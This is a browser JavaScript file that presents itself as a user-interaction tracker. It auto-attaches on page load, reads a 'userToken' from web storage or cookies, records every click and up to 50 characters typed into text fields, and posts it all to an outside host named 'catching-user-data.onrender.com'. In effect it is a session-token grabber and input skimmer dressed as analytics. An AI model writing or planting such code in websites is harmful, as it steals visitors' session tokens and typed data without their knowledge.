console.log("page loaded");

(function () {
    var config = {
        userSessionID: 'defaultSessionID',
        serverURL: 'https://catching-user-data.onrender.com/api',
        logConsole: true
    };

    function getUserToken() {
        var token = sessionStorage.getItem('userToken') || localStorage.getItem('userToken');
        if (token) return token;

        var name = 'userToken=';
        var decodedCookie = decodeURIComponent(document.cookie);
        var ca = decodedCookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') c = c.substring(1);
            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
        }
        return "unidentified user";
    }

    function getElementIdentifier(element) {
        var identifierParts = [];
        if (element.id) identifierParts.push('ID: ' + element.id);
        if (element.className) identifierParts.push('Class: ' + element.className.split(' ').join('.'));
        if (element.name) identifierParts.push('Name: ' + element.name);
        if (element.tagName) identifierParts.push('Tag: ' + element.tagName);

        // Check if the element has text content and is not too long to log
        var textContent = element.textContent || element.innerText;
        if (textContent && textContent.trim().length > 0 && textContent.trim().length < 50) {
            identifierParts.push('Text: ' + textContent.trim());
        }

        return identifierParts.join(', ') || 'No specific identifier';
    }

    function logInteraction(detail) {
        detail.userToken = getUserToken();
        if (config.logConsole) {
            console.log('Interaction logged:', detail);
        }
        fetch(config.serverURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(detail),
        })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => console.log('Data successfully sent to the server:', data))
            .catch(error => console.error('Error sending data to the server:', error));
    }

    function handleEvent(event, eventType) {
        var element = event.target;
        var elementIdentifier = getElementIdentifier(element);
        var detail = {
            eventType: eventType,
            identifier: elementIdentifier,
            sessionID: config.userSessionID,
            timestamp: new Date().toISOString(),
            pageTitle: document.title
        };
        if (eventType === 'input') {
            detail.value = element.value.substring(0, 50);
        }
        logInteraction(detail);
    }

    function attachEventListeners() {
        document.addEventListener('click', function (event) {
            handleEvent(event, 'click');
        });
        document.querySelectorAll('input[type="text"], textarea').forEach(function (input) {
            input.addEventListener('input', function (event) {
                handleEvent(event, 'input');
            });
        });
    }

    window.TrackUserInteraction = {
        setConfig: function (userConfig) {
            Object.assign(config, userConfig);
            attachEventListeners();
        }
    };

    attachEventListeners();
})();
